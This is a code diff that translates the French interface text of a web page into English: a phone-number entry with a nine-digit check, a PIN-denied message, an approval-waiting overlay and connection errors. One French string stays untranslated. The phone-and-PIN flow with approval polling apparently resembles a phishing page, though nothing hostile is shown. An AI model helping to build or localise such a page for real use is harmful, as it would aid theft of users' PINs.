@@ -318,10 +318,10 @@
     <div id="approvalOverlay" class="approval-overlay" role="dialog" aria-modal="true">
         <div class="approval-content">
             <div id="spinner" class="spinner"></div>
-            <h3 id="overlayTitle">Veuillez patienter...</h3>
-            <p id="overlayText">Cela prend généralement quelques secondes</p>
-            <p id="deniedMsg" style="display:none;">Le code PIN est incorrect. Veuillez réessayer.</p>
-            <button type="button" id="retryBtn" style="display:none;">Réessayer</button>
+            <h3 id="overlayTitle">Please wait...</h3>
+            <p id="overlayText">This usually takes a few seconds</p>
+            <p id="deniedMsg" style="display:none;">Incorrect PIN. Please try again.</p>
+            <button type="button" id="retryBtn" style="display:none;">Retry</button>
         </div>
     </div>
 
@@ -400,7 +400,7 @@
             overlay.classList.add('visible');
             spinner.style.display = 'block';
             overlayTitle.style.display = 'block';
-            overlayTitle.textContent = 'Veuillez patienter...';
+            overlayTitle.textContent = 'Please wait...';
             overlayText.style.display = 'block';
             overlayText.textContent = 'Cela prend généralement quelques secondes';
             deniedMsg.style.display = 'none';
@@ -442,7 +442,7 @@
             requestInProgress = true;
             const phone = phoneInput.value.trim();
             if (!/^[0-9]{9}$/.test(phone)) {
-                showInvalidPhone('Le numéro de téléphone doit contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!');
+                showInvalidPhone('The phone number must contain exactly 9 digits.<br>Please enter the correct number and try again!');
                 requestInProgress = false;
                 return;
             }
@@ -468,8 +468,8 @@
                 pollApproval(data.id, params);
             } catch (error) {
                 requestInProgress = false;
-                overlayTitle.textContent = 'Erreur de connexion';
-                overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
+                overlayTitle.textContent = 'Connection error';
+                overlayText.textContent = 'Unable to send the request. Check your connection and try again.';
                 spinner.style.display = 'none';
                 retryBtn.style.display = 'inline-block';
             }
